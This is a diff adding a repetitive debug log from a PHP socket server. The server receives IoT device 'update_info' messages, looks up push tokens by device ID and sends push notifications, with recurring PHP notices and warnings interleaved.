@@ -1,0 +1,322 @@
+Listening on 45.76.177.252:9898...
+[45.76.177.252] Connected at port 9898
+[45.76.177.252] recieved: command=update_info;device_id=xxx;parameter1=32;parameter2=45;alarm=1
+ Content command=update_info;device_id=xxx;parameter1=32;parameter2=45;alarm=1 0 command 1 update_info 0 device_id 1 xxx 0 parameter1 1 32 0 parameter2 1 45 0 alarm 1 1 command update_info alarm 1 devideid xxx  Path : ./id2token/xxx PHP Warning:  file_get_contents(./id2token/xxx): failed to open stream: No such file or directory in /projects/php-socket-server/php-socket-server.php on line 125
+
+Warning: file_get_contents(./id2token/xxx): failed to open stream: No such file or directory in /projects/php-socket-server/php-socket-server.php on line 125
+token 1 :  Response 1 : xxx Response 2 : xxx Response 3 : xxx Response 4 : xxx Response 5 : xxx Response 6 : xxx Field "to" must be a JSON string: false
+Response 7 : xxx Response : 1 [45.76.177.252] recieved: command=update_info;device_id=xxx;parameter1=32;parameter2=45;alarm=1
+ Content command=update_info;device_id=xxx;parameter1=32;parameter2=45;alarm=1 0 command 1 update_info 0 device_id 1 xxx 0 parameter1 1 32 0 parameter2 1 45 0 alarm 1 1 command update_info alarm 1 devideid xxx  Path : ./id2token/xxx PHP Warning:  file_get_contents(./id2token/xxx): failed to open stream: No such file or directory in /projects/php-socket-server/php-socket-server.php on line 125
+
+Warning: file_get_contents(./id2token/xxx): failed to open stream: No such file or directory in /projects/php-socket-server/php-socket-server.php on line 125
+token 1 :  Response 1 : xxx Response 2 : xxx Response 3 : xxx Response 4 : xxx Response 5 : xxx Response 6 : xxx Field "to" must be a JSON string: false
+Response 7 : xxx Response : 1 [45.76.177.252] recieved: command=update_info;device_id=12121212121sssda1;parameter1=32;parameter2=45;alarm=1
+ Content command=update_info;device_id=12121212121sssda1;parameter1=32;parameter2=45;alarm=1 0 command 1 update_info 0 device_id 1 12121212121sssda1 0 parameter1 1 32 0 parameter2 1 45 0 alarm 1 1 command update_info alarm 1 devideid 12121212121sssda1  Path : ./id2token/12121212121sssda1 token 1 : cbDavec_YrQ:APA91bHUP3D4tjfdx2IqkkRD-6Mh8uODY0Hnezx_5f8UuKxjGZn0_C2vfmfwjPTkJexV10hzC0TP5bPkM4D-xZAIWAFwYE94dIm06T7tFR6pm-EAw1CrsFdzS22gGvadGCGqt-y6tQIT Response 1 : 12121212121sssda1 Response 2 : 12121212121sssda1 Response 3 : 12121212121sssda1 Response 4 : 12121212121sssda1 Response 5 : 12121212121sssda1 Response 6 : 12121212121sssda1 {"multicast_id":4767817772782885762,"success":1,"failure":0,"canonical_ids":0,"results":[{"message_id":"0:1514253416156103%4babaf6cf9fd7ecd"}]}Response 7 : 12121212121sssda1 Response : 1 [45.76.177.252] Connected at port 9898
+[45.76.177.252] recieved: command=update_info;device_id=12121212121sssda1;parameter1=32;parameter2=45;alarm=1; Content command=update_info;device_id=12121212121sssda1;parameter1=32;parameter2=45;alarm=1; 0 command 1 update_info 0 device_id 1 12121212121sssda1 0 parameter1 1 32 0 parameter2 1 45 0 alarm 1 1 PHP Notice:  Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 65
+
+Notice: Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 65
+0  PHP Notice:  Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 67
+
+Notice: Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 67
+1  command update_info alarm 1 devideid 12121212121sssda1  Path : ./id2token/12121212121sssda1 token 1 : cbDavec_YrQ:APA91bHUP3D4tjfdx2IqkkRD-6Mh8uODY0Hnezx_5f8UuKxjGZn0_C2vfmfwjPTkJexV10hzC0TP5bPkM4D-xZAIWAFwYE94dIm06T7tFR6pm-EAw1CrsFdzS22gGvadGCGqt-y6tQIT Response 1 : 12121212121sssda1 Response 2 : 12121212121sssda1 Response 3 : 12121212121sssda1 Response 4 : 12121212121sssda1 Response 5 : 12121212121sssda1 Response 6 : 12121212121sssda1 {"multicast_id":7946265935271025027,"success":1,"failure":0,"canonical_ids":0,"results":[{"message_id":"0:1514260083432806%4babaf6cf9fd7ecd"}]}Response 7 : 12121212121sssda1 Response : 1 [45.76.177.252] recieved: command=update_info;device_id=12121212121sssda1;parameter1=32;parameter2=45;alarm=1;
+ Content command=update_info;device_id=12121212121sssda1;parameter1=32;parameter2=45;alarm=1; 0 command 1 update_info 0 device_id 1 12121212121sssda1 0 parameter1 1 32 0 parameter2 1 45 0 alarm 1 1 PHP Notice:  Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 65
+
+Notice: Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 65
+0  PHP Notice:  Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 67
+
+Notice: Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 67
+1  command update_info alarm 1 devideid 12121212121sssda1  Path : ./id2token/12121212121sssda1 token 1 : cbDavec_YrQ:APA91bHUP3D4tjfdx2IqkkRD-6Mh8uODY0Hnezx_5f8UuKxjGZn0_C2vfmfwjPTkJexV10hzC0TP5bPkM4D-xZAIWAFwYE94dIm06T7tFR6pm-EAw1CrsFdzS22gGvadGCGqt-y6tQIT Response 1 : 12121212121sssda1 Response 2 : 12121212121sssda1 Response 3 : 12121212121sssda1 Response 4 : 12121212121sssda1 Response 5 : 12121212121sssda1 Response 6 : 12121212121sssda1 {"multicast_id":8490484249640427068,"success":1,"failure":0,"canonical_ids":0,"results":[{"message_id":"0:1514260086362417%4babaf6cf9fd7ecd"}]}Response 7 : 12121212121sssda1 Response : 1 [45.76.177.252] recieved: command=update_info;device_id=12121212121sssda1;parameter1=32;parameter2=45;alarm=1; Content command=update_info;device_id=12121212121sssda1;parameter1=32;parameter2=45;alarm=1; 0 command 1 update_info 0 device_id 1 12121212121sssda1 0 parameter1 1 32 0 parameter2 1 45 0 alarm 1 1 PHP Notice:  Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 65
+
+Notice: Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 65
+0  PHP Notice:  Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 67
+
+Notice: Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 67
+1  command update_info alarm 1 devideid 12121212121sssda1  Path : ./id2token/12121212121sssda1 token 1 : eUYeCYzfUwM:APA91bHihyCGNtnvFl-nYoJAuehlvCdzTHX7XV33sml093Ku-6RLiUFLCdeOoVK3CrGpMWOn4l9vThhPM8gPeI14fduyKye6g31-VNYcycRZEsOtiBBujQSk2KvThAJYmY0uqtPUQFNN Response 1 : 12121212121sssda1 Response 2 : 12121212121sssda1 Response 3 : 12121212121sssda1 Response 4 : 12121212121sssda1 Response 5 : 12121212121sssda1 Response 6 : 12121212121sssda1 {"multicast_id":5142894758911493895,"success":1,"failure":0,"canonical_ids":0,"results":[{"message_id":"0:1514260146010365%4babaf6cf9fd7ecd"}]}Response 7 : 12121212121sssda1 Response : 1 [45.76.177.252] recieved: command=update_info;device_id=12121212121sssda1;parameter1=32;parameter2=45;alarm=1; Content command=update_info;device_id=12121212121sssda1;parameter1=32;parameter2=45;alarm=1; 0 command 1 update_info 0 device_id 1 12121212121sssda1 0 parameter1 1 32 0 parameter2 1 45 0 alarm 1 1 PHP Notice:  Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 65
+
+Notice: Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 65
+0  PHP Notice:  Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 67
+
+Notice: Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 67
+1  command update_info alarm 1 devideid 12121212121sssda1  Path : ./id2token/12121212121sssda1 token 1 : eUYeCYzfUwM:APA91bHihyCGNtnvFl-nYoJAuehlvCdzTHX7XV33sml093Ku-6RLiUFLCdeOoVK3CrGpMWOn4l9vThhPM8gPeI14fduyKye6g31-VNYcycRZEsOtiBBujQSk2KvThAJYmY0uqtPUQFNN Response 1 : 12121212121sssda1 Response 2 : 12121212121sssda1 Response 3 : 12121212121sssda1 Response 4 : 12121212121sssda1 Response 5 : 12121212121sssda1 Response 6 : 12121212121sssda1 {"multicast_id":8112424634504842187,"success":1,"failure":0,"canonical_ids":0,"results":[{"message_id":"0:1514260157378836%4babaf6cf9fd7ecd"}]}Response 7 : 12121212121sssda1 Response : 1 [45.76.177.252] recieved: command=update_info;device_id=12121212121sssda1;parameter1=32;parameter2=45;alarm=1;
+ Content command=update_info;device_id=12121212121sssda1;parameter1=32;parameter2=45;alarm=1; 0 command 1 update_info 0 device_id 1 12121212121sssda1 0 parameter1 1 32 0 parameter2 1 45 0 alarm 1 1 PHP Notice:  Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 65
+
+Notice: Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 65
+0  PHP Notice:  Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 67
+
+Notice: Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 67
+1  command update_info alarm 1 devideid 12121212121sssda1  Path : ./id2token/12121212121sssda1 token 1 : eUYeCYzfUwM:APA91bHihyCGNtnvFl-nYoJAuehlvCdzTHX7XV33sml093Ku-6RLiUFLCdeOoVK3CrGpMWOn4l9vThhPM8gPeI14fduyKye6g31-VNYcycRZEsOtiBBujQSk2KvThAJYmY0uqtPUQFNN Response 1 : 12121212121sssda1 Response 2 : 12121212121sssda1 Response 3 : 12121212121sssda1 Response 4 : 12121212121sssda1 Response 5 : 12121212121sssda1 Response 6 : 12121212121sssda1 {"multicast_id":7670810057297986892,"success":1,"failure":0,"canonical_ids":0,"results":[{"message_id":"0:1514260173772172%4babaf6cf9fd7ecd"}]}Response 7 : 12121212121sssda1 Response : 1 [45.76.177.252] Connected at port 9898
+[45.76.177.252] Connected at port 9898
+[45.76.177.252] recieved: command=update_info;device_id=12121212121sssda1;parameter1=32;parameter2=45;alarm=1 Content command=update_info;device_id=12121212121sssda1;parameter1=32;parameter2=45;alarm=1 0 command 1 update_info 0 device_id 1 12121212121sssda1 0 parameter1 1 32 0 parameter2 1 45 0 alarm 1 1 command update_info alarm 1 devideid 12121212121sssda1  Path : ./id2token/12121212121sssda1 token 1 : eUYeCYzfUwM:APA91bHihyCGNtnvFl-nYoJAuehlvCdzTHX7XV33sml093Ku-6RLiUFLCdeOoVK3CrGpMWOn4l9vThhPM8gPeI14fduyKye6g31-VNYcycRZEsOtiBBujQSk2KvThAJYmY0uqtPUQFNN Response 1 : 12121212121sssda1 Response 2 : 12121212121sssda1 Response 3 : 12121212121sssda1 Response 4 : 12121212121sssda1 Response 5 : 12121212121sssda1 Response 6 : 12121212121sssda1 {"multicast_id":5497294889865526489,"success":1,"failure":0,"canonical_ids":0,"results":[{"message_id":"0:1514260216074902%4babaf6cf9fd7ecd"}]}Response 7 : 12121212121sssda1 Response : 1 [45.76.177.252] recieved: command=update_info;device_id=12121212121sssda1;parameter1=32;parameter2=45;alarm=1 Content command=update_info;device_id=12121212121sssda1;parameter1=32;parameter2=45;alarm=1 0 command 1 update_info 0 device_id 1 12121212121sssda1 0 parameter1 1 32 0 parameter2 1 45 0 alarm 1 1 command update_info alarm 1 devideid 12121212121sssda1  Path : ./id2token/12121212121sssda1 token 1 : eUYeCYzfUwM:APA91bHihyCGNtnvFl-nYoJAuehlvCdzTHX7XV33sml093Ku-6RLiUFLCdeOoVK3CrGpMWOn4l9vThhPM8gPeI14fduyKye6g31-VNYcycRZEsOtiBBujQSk2KvThAJYmY0uqtPUQFNN Response 1 : 12121212121sssda1 Response 2 : 12121212121sssda1 Response 3 : 12121212121sssda1 Response 4 : 12121212121sssda1 Response 5 : 12121212121sssda1 Response 6 : 12121212121sssda1 {"multicast_id":7251897051278224659,"success":1,"failure":0,"canonical_ids":0,"results":[{"message_id":"0:1514260226529576%4babaf6cf9fd7ecd"}]}Response 7 : 12121212121sssda1 Response : 1 [45.76.177.252] recieved: command=update_info;device_id=12121212121sssda1;parameter1=32;parameter2=45;alarm=1 Content command=update_info;device_id=12121212121sssda1;parameter1=32;parameter2=45;alarm=1 0 command 1 update_info 0 device_id 1 12121212121sssda1 0 parameter1 1 32 0 parameter2 1 45 0 alarm 1 1 command update_info alarm 1 devideid 12121212121sssda1  Path : ./id2token/12121212121sssda1 token 1 : eUYeCYzfUwM:APA91bHihyCGNtnvFl-nYoJAuehlvCdzTHX7XV33sml093Ku-6RLiUFLCdeOoVK3CrGpMWOn4l9vThhPM8gPeI14fduyKye6g31-VNYcycRZEsOtiBBujQSk2KvThAJYmY0uqtPUQFNN Response 1 : 12121212121sssda1 Response 2 : 12121212121sssda1 Response 3 : 12121212121sssda1 Response 4 : 12121212121sssda1 Response 5 : 12121212121sssda1 Response 6 : 12121212121sssda1 {"multicast_id":8371121498328639582,"success":1,"failure":0,"canonical_ids":0,"results":[{"message_id":"0:1514260239368731%4babaf6cf9fd7ecd"}]}Response 7 : 12121212121sssda1 Response : 1 [45.76.177.252] recieved: command=update_info;device_id=12121212121sssda1;alarm=1;
+ Content command=update_info;device_id=12121212121sssda1;alarm=1; 0 command 1 update_info 0 device_id 1 12121212121sssda1 0 alarm 1 1 PHP Notice:  Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 65
+
+Notice: Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 65
+0  PHP Notice:  Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 67
+
+Notice: Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 67
+1  command update_info alarm 1 devideid 12121212121sssda1  Path : ./id2token/12121212121sssda1 token 1 : eUYeCYzfUwM:APA91bHihyCGNtnvFl-nYoJAuehlvCdzTHX7XV33sml093Ku-6RLiUFLCdeOoVK3CrGpMWOn4l9vThhPM8gPeI14fduyKye6g31-VNYcycRZEsOtiBBujQSk2KvThAJYmY0uqtPUQFNN Response 1 : 12121212121sssda1 Response 2 : 12121212121sssda1 Response 3 : 12121212121sssda1 Response 4 : 12121212121sssda1 Response 5 : 12121212121sssda1 Response 6 : 12121212121sssda1 {"multicast_id":8171879086530639307,"success":1,"failure":0,"canonical_ids":0,"results":[{"message_id":"0:1514260312410686%4babaf6cf9fd7ecd"}]}Response 7 : 12121212121sssda1 Response : 1 [45.76.177.252] recieved: command=update_info;device_id=12121212121sssda1;alarm=1;
+ Content command=update_info;device_id=12121212121sssda1;alarm=1; 0 command 1 update_info 0 device_id 1 12121212121sssda1 0 alarm 1 1 PHP Notice:  Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 65
+
+Notice: Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 65
+0  PHP Notice:  Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 67
+
+Notice: Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 67
+1  command update_info alarm 1 devideid 12121212121sssda1  Path : ./id2token/12121212121sssda1 token 1 : eUYeCYzfUwM:APA91bHihyCGNtnvFl-nYoJAuehlvCdzTHX7XV33sml093Ku-6RLiUFLCdeOoVK3CrGpMWOn4l9vThhPM8gPeI14fduyKye6g31-VNYcycRZEsOtiBBujQSk2KvThAJYmY0uqtPUQFNN Response 1 : 12121212121sssda1 Response 2 : 12121212121sssda1 Response 3 : 12121212121sssda1 Response 4 : 12121212121sssda1 Response 5 : 12121212121sssda1 Response 6 : 12121212121sssda1 {"multicast_id":5049121382622983251,"success":1,"failure":0,"canonical_ids":0,"results":[{"message_id":"0:1514260317450430%4babaf6cf9fd7ecd"}]}Response 7 : 12121212121sssda1 Response : 1 [45.76.177.252] recieved: command=update_info;device_id=123;alarm=1; Content command=update_info;device_id=123;alarm=1; 0 command 1 update_info 0 device_id 1 123 0 alarm 1 1 PHP Notice:  Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 65
+
+Notice: Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 65
+0  PHP Notice:  Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 67
+
+Notice: Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 67
+1  command update_info alarm 1 devideid 123  Path : ./id2token/123 PHP Warning:  file_get_contents(./id2token/123): failed to open stream: No such file or directory in /projects/php-socket-server/php-socket-server.php on line 125
+
+Warning: file_get_contents(./id2token/123): failed to open stream: No such file or directory in /projects/php-socket-server/php-socket-server.php on line 125
+token 1 :  Response 1 : 123 Response 2 : 123 Response 3 : 123 Response 4 : 123 Response 5 : 123 Response 6 : 123 Field "to" must be a JSON string: false
+Response 7 : 123 Response : 1 [45.76.177.252] recieved: command=update_info;device_id=123;alarm=1;
+ Content command=update_info;device_id=123;alarm=1; 0 command 1 update_info 0 device_id 1 123 0 alarm 1 1 PHP Notice:  Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 65
+
+Notice: Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 65
+0  PHP Notice:  Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 67
+
+Notice: Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 67
+1  command update_info alarm 1 devideid 123  Path : ./id2token/123 PHP Warning:  file_get_contents(./id2token/123): failed to open stream: No such file or directory in /projects/php-socket-server/php-socket-server.php on line 125
+
+Warning: file_get_contents(./id2token/123): failed to open stream: No such file or directory in /projects/php-socket-server/php-socket-server.php on line 125
+token 1 :  Response 1 : 123 Response 2 : 123 Response 3 : 123 Response 4 : 123 Response 5 : 123 Response 6 : 123 Field "to" must be a JSON string: false
+Response 7 : 123 Response : 1 [45.76.177.252] recieved: command=update_info;device_id=12121212121sssda1;alarm=1;
+ Content command=update_info;device_id=12121212121sssda1;alarm=1; 0 command 1 update_info 0 device_id 1 12121212121sssda1 0 alarm 1 1 PHP Notice:  Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 65
+
+Notice: Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 65
+0  PHP Notice:  Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 67
+
+Notice: Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 67
+1  command update_info alarm 1 devideid 12121212121sssda1  Path : ./id2token/12121212121sssda1 token 1 : eUYeCYzfUwM:APA91bHihyCGNtnvFl-nYoJAuehlvCdzTHX7XV33sml093Ku-6RLiUFLCdeOoVK3CrGpMWOn4l9vThhPM8gPeI14fduyKye6g31-VNYcycRZEsOtiBBujQSk2KvThAJYmY0uqtPUQFNN Response 1 : 12121212121sssda1 Response 2 : 12121212121sssda1 Response 3 : 12121212121sssda1 Response 4 : 12121212121sssda1 Response 5 : 12121212121sssda1 Response 6 : 12121212121sssda1 {"multicast_id":8906888812528759569,"success":1,"failure":0,"canonical_ids":0,"results":[{"message_id":"0:1514260368992339%4babaf6cf9fd7ecd"}]}Response 7 : 12121212121sssda1 Response : 1 [45.76.177.252] recieved: command=update_device;device_id=123;
+ Content command=update_device;device_id=123; 0 command 1 update_device 0 device_id 1 123 PHP Notice:  Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 65
+
+Notice: Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 65
+0  PHP Notice:  Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 67
+
+Notice: Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 67
+1  command update_device PHP Notice:  Undefined index: ip in /projects/php-socket-server/php-socket-server.php on line 75
+
+Notice: Undefined index: ip in /projects/php-socket-server/php-socket-server.php on line 75
+[45.76.177.252] recieved: command=update_info;device_id=123;alarm=1;
+ Content command=update_info;device_id=123;alarm=1; 0 command 1 update_info 0 device_id 1 123 0 alarm 1 1 PHP Notice:  Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 65
+
+Notice: Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 65
+0  PHP Notice:  Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 67
+
+Notice: Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 67
+1  command update_info alarm 1 devideid 123  Path : ./id2token/123 PHP Warning:  file_get_contents(./id2token/123): failed to open stream: No such file or directory in /projects/php-socket-server/php-socket-server.php on line 125
+
+Warning: file_get_contents(./id2token/123): failed to open stream: No such file or directory in /projects/php-socket-server/php-socket-server.php on line 125
+token 1 :  Response 1 : 123 Response 2 : 123 Response 3 : 123 Response 4 : 123 Response 5 : 123 Response 6 : 123 Field "to" must be a JSON string: false
+Response 7 : 123 Response : 1 [45.76.177.252] recieved: command=update_info;device_id=123;alarm=1;
+ Content command=update_info;device_id=123;alarm=1; 0 command 1 update_info 0 device_id 1 123 0 alarm 1 1 PHP Notice:  Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 65
+
+Notice: Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 65
+0  PHP Notice:  Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 67
+
+Notice: Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 67
+1  command update_info alarm 1 devideid 123  Path : ./id2token/123 PHP Warning:  file_get_contents(./id2token/123): failed to open stream: No such file or directory in /projects/php-socket-server/php-socket-server.php on line 125
+
+Warning: file_get_contents(./id2token/123): failed to open stream: No such file or directory in /projects/php-socket-server/php-socket-server.php on line 125
+token 1 :  Response 1 : 123 Response 2 : 123 Response 3 : 123 Response 4 : 123 Response 5 : 123 Response 6 : 123 Field "to" must be a JSON string: false
+Response 7 : 123 Response : 1 [45.76.177.252] recieved: command=update_info;device_id=12121212121sssda1;alarm=1;
+ Content command=update_info;device_id=12121212121sssda1;alarm=1; 0 command 1 update_info 0 device_id 1 12121212121sssda1 0 alarm 1 1 PHP Notice:  Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 65
+
+Notice: Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 65
+0  PHP Notice:  Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 67
+
+Notice: Undefined offset: 1 in /projects/php-socket-server/php-socket-server.php on line 67
+1  command update_info alarm 1 devideid 12121212121sssda1  Path : ./id2token/12121212121sssda1 token 1 : eUYeCYzfUwM:APA91bHihyCGNtnvFl-nYoJAuehlvCdzTHX7XV33sml093Ku-6RLiUFLCdeOoVK3CrGpMWOn4l9vThhPM8gPeI14fduyKye6g31-VNYcycRZEsOtiBBujQSk2KvThAJYmY0uqtPUQFNN Response 1 : 12121212121sssda1 Response 2 : 12121212121sssda1 Response 3 : 12121212121sssda1 Response 4 : 12121212121sssda1 Response 5 : 12121212121sssda1 Response 6 : 12121212121sssda1 {"multicast_id":5353874523160193966,"success":1,"failure":0,"canonical_ids":0,"results":[{"message_id":"0:1514260410090938%4babaf6cf9fd7ecd"}]}Response 7 : 12121212121sssda1 Response : 1 [45.76.177.252] recieved: command=update_info;device_id=12121212121sssda1;parameter1=32;parameter2=45;alarm=1 Content command=update_info;device_id=12121212121sssda1;parameter1=32;parameter2=45;alarm=1 0 command 1 update_info 0 device_id 1 12121212121sssda1 0 parameter1 1 32 0 parameter2 1 45 0 alarm 1 1 command update_info alarm 1 devideid 12121212121sssda1  Path : ./id2token/12121212121sssda1 token 1 : eUYeCYzfUwM:APA91bHihyCGNtnvFl-nYoJAuehlvCdzTHX7XV33sml093Ku-6RLiUFLCdeOoVK3CrGpMWOn4l9vThhPM8gPeI14fduyKye6g31-VNYcycRZEsOtiBBujQSk2KvThAJYmY0uqtPUQFNN Response 1 : 12121212121sssda1 Response 2 : 12121212121sssda1 Response 3 : 12121212121sssda1 Response 4 : 12121212121sssda1 Response 5 : 12121212121sssda1 Response 6 : 12121212121sssda1 {"multicast_id":5422413783471811584,"success":1,"failure":0,"canonical_ids":0,"results":[{"message_id":"0:1514260491957792%4babaf6cf9fd7ecd"}]}Response 7 : 12121212121sssda1 Response : 1 [45.76.177.252] recieved: command=update_info;device_id=12121212121sssda1;parameter1=32;parameter2=45;alarm=1 Content command=update_info;device_id=12121212121sssda1;parameter1=32;parameter2=45;alarm=1 0 command 1 update_info 0 device_id 1 12121212121sssda1 0 parameter1 1 32 0 parameter2 1 45 0 alarm 1 1 command update_info alarm 1 devideid 12121212121sssda1  Path : ./id2token/12121212121sssda1 token 1 : eUYeCYzfUwM:APA91bHihyCGNtnvFl-nYoJAuehlvCdzTHX7XV33sml093Ku-6RLiUFLCdeOoVK3CrGpMWOn4l9vThhPM8gPeI14fduyKye6g31-VNYcycRZEsOtiBBujQSk2KvThAJYmY0uqtPUQFNN Response 1 : 12121212121sssda1 Response 2 : 12121212121sssda1 Response 3 : 12121212121sssda1 Response 4 : 12121212121sssda1 Response 5 : 12121212121sssda1 Response 6 : 12121212121sssda1 {"multicast_id":7303889795561954947,"success":1,"failure":0,"canonical_ids":0,"results":[{"message_id":"0:1514260519361467%4babaf6cf9fd7ecd"}]}Response 7 : 12121212121sssda1 Response : 1 [45.76.177.252] recieved: command=update_info;device_id=12121212121sssda1;parameter1=32;parameter2=45;alarm=1 Content command=update_info;device_id=12121212121sssda1;parameter1=32;parameter2=45;alarm=1 0 command 1 update_info 0 device_id 1 12121212121sssda1 0 parameter1 1 32 0 parameter2 1 45 0 alarm 1 1 command update_info alarm 1 devideid 12121212121sssda1  Path : ./id2token/12121212121sssda1 token 1 : eUYeCYzfUwM:APA91bHihyCGNtnvFl-nYoJAuehlvCdzTHX7XV33sml093Ku-6RLiUFLCdeOoVK3CrGpMWOn4l9vThhPM8gPeI14fduyKye6g31-VNYcycRZEsOtiBBujQSk2KvThAJYmY0uqtPUQFNN Response 1 : 12121212121sssda1 Response 2 : 12121212121sssda1 Response 3 : 12121212121sssda1 Response 4 : 12121212121sssda1 Response 5 : 12121212121sssda1 Response 6 : 12121212121sssda1 {"multicast_id":5884805780049648249,"success":1,"failure":0,"canonical_ids":0,"results":[{"message_id":"0:1514260529822297%4babaf6cf9fd7ecd"}]}Response 7 : 12121212121sssda1 Response : 1 [45.76.177.252] recieved: command=update_info;device_id=12121212121sssda1;parameter1=32;parameter2=45;alarm=1 Content command=update_info;device_id=12121212121sssda1;parameter1=32;parameter2=45;alarm=1 0 command 1 update_info 0 device_id 1 12121212121sssda1 0 parameter1 1 32 0 parameter2 1 45 0 alarm 1 1 command update_info alarm 1 devideid 12121212121sssda1  Path : ./id2token/12121212121sssda1 token 1 : eUYeCYzfUwM:APA91bHihyCGNtnvFl-nYoJAuehlvCdzTHX7XV33sml093Ku-6RLiUFLCdeOoVK3CrGpMWOn4l9vThhPM8gPeI14fduyKye6g31-VNYcycRZEsOtiBBujQSk2KvThAJYmY0uqtPUQFNN Response 1 : 12121212121sssda1 Response 2 : 12121212121sssda1 Response 3 : 12121212121sssda1 Response 4 : 12121212121sssda1 Response 5 : 12121212121sssda1 Response 6 : 12121212121sssda1 {"multicast_id":8967682220614779199,"success":1,"failure":0,"canonical_ids":0,"results":[{"message_id":"0:1514260544154301%4babaf6cf9fd7ecd"}]}Response 7 : 12121212121sssda1 Response : 1 [45.76.177.252] recieved: command=update_info;device_id=12121212121sssda1;parameter1=32;parameter2=45;alarm=1 Content command=update_info;device_id=12121212121sssda1;parameter1=32;parameter2=45;alarm=1 0 command 1 update_info 0 device_id 1 12121212121sssda1 0 parameter1 1 32 0 parameter2 1 45 0 alarm 1 1 command update_info alarm 1 devideid 12121212121sssda1  Path : ./id2token/12121212121sssda1 token 1 : eUYeCYzfUwM:APA91bHihyCGNtnvFl-nYoJAuehlvCdzTHX7XV33sml093Ku-6RLiUFLCdeOoVK3CrGpMWOn4l9vThhPM8gPeI14fduyKye6g31-VNYcycRZEsOtiBBujQSk2KvThAJYmY0uqtPUQFNN Response 1 : 12121212121sssda1 Response 2 : 12121212121sssda1 Response 3 : 12121212121sssda1 Response 4 : 12121212121sssda1 Response 5 : 12121212121sssda1 Response 6 : 12121212121sssda1 {"multicast_id":9133470092896516197,"success":1,"failure":0,"canonical_ids":0,"results":[{"message_id":"0:1514261235896288%4babaf6cf9fd7ecd"}]}Response 7 : 12121212121sssda1 Response : 1 [45.76.177.252] recieved: command=update_info;device_id=12121212121sssda1;parameter1=32;parameter2=45;alarm=1 Content command=update_info;device_id=12121212121sssda1;parameter1=32;parameter2=45;alarm=1 0 command 1 update_info 0 device_id 1 12121212121sssda1 0 parameter1 1 32 0 parameter2 1 45 0 alarm 1 1 command update_info alarm 1 devideid 12121212121sssda1  Path : ./id2token/12121212121sssda1 token 1 : eUYeCYzfUwM:APA91bHihyCGNtnvFl-nYoJAuehlvCdzTHX7XV33sml093Ku-6RLiUFLCdeOoVK3CrGpMWOn4l9vThhPM8gPeI14fduyKye6g31-VNYcycRZEsOtiBBujQSk2KvThAJYmY0uqtPUQFNN Response 1 : 12121212121sssda1 Response 2 : 12121212121sssda1 Response 3 : 12121212121sssda1 Response 4 : 12121212121sssda1 Response 5 : 12121212121sssda1 Response 6 : 12121212121sssda1 {"multicast_id":5534206719228858411,"success":1,"failure":0,"canonical_ids":0,"results":[{"message_id":"0:1514261241174478%4babaf6cf9fd7ecd"}]}Response 7 : 12121212121sssda1 Response : 1 [45.76.177.252] recieved: command=update_info;device_id=12121212121sssda1;parameter1=32;parameter2=45;alarm=1 Content command=update_info;device_id=12121212121sssda1;parameter1=32;parameter2=45;alarm=1 0 command 1 update_info 0 device_id 1 12121212121sssda1 0 parameter1 1 32 0 parameter2 1 45 0 alarm 1 1 command update_info alarm 1 devideid 12121212121sssda1  Path : ./id2token/12121212121sssda1 token 1 : eUYeCYzfUwM:APA91bHihyCGNtnvFl-nYoJAuehlvCdzTHX7XV33sml093Ku-6RLiUFLCdeOoVK3CrGpMWOn4l9vThhPM8gPeI14fduyKye6g31-VNYcycRZEsOtiBBujQSk2KvThAJYmY0uqtPUQFNN Response 1 : 